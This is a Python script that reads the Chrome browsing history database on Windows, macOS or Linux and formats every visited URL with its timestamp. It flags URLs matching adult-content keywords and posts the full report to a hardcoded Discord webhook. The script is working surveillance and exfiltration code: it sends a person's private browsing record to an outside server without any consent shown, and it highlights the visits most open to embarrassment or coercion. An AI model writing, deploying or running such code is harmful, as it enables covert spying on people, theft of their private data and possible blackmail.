import sqlite3
import os
import platform
import datetime
import requests

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1320743687109476393/03lSr_qHl0gJyrBWxBRg1uzLwTdwnWhp0p-mM-AWlaHxqn5bbL3ALjfVZUkiV01ReXee"

# List of keywords for adult sites (just a few examples)
ADULT_KEYWORDS = ["xxx", "porn", "hentai", "adult", "sex", "prn", "nsfw"]

# Function to fetch Chrome's browsing history
def get_chrome_history():
    # Determine the correct path for the Chrome History file based on the operating system
    if platform.system() == "Windows":
        chrome_history_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History")
    elif platform.system() == "Darwin":
        chrome_history_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/History")
    else:
        chrome_history_path = os.path.expanduser("~/.config/google-chrome/Default/History")

    if not os.path.exists(chrome_history_path):
        return "Chrome history file not found."

    # Open the Chrome history SQLite file
    conn = sqlite3.connect(chrome_history_path)
    cursor = conn.cursor()

    # Query the browsing history (URLs and visit times)
    cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
    history = cursor.fetchall()
    conn.close()

    # Format the history data and check for adult content
    formatted_history = "**📜 Browser History Report**\n\n**Recent Visits:**\n"
    adult_sites_visited = []

    for url, timestamp in history:
        visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
        formatted_history += f"• **{url}** - Last visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')}\n"

        # Check if the URL contains any adult content keywords
        for keyword in ADULT_KEYWORDS:
            if keyword.lower() in url.lower():
                adult_sites_visited.append(url)

    # If any adult websites were visited, notify
    if adult_sites_visited:
        formatted_history += "\n**⚠️ ALERT: Adult Websites Detected:**\n"
        for adult_url in adult_sites_visited:
            formatted_history += f"  - **{adult_url}**\n"
        formatted_history += "\nPlease review the above websites."

    return formatted_history if formatted_history else "No browsing history found."

# Send the info to Discord
def send_to_discord(message):
    data = {
        "content": message,
    }
    response = requests.post(webhook_url, json=data)
    return response

# Main function
if __name__ == "__main__":
    history_info = get_chrome_history()
    if history_info:
        response = send_to_discord(history_info)
        if response.status_code == 204:
            print("History successfully sent to Discord!")
        else:
            print(f"Failed to send info. Status code: {response.status_code}")
            
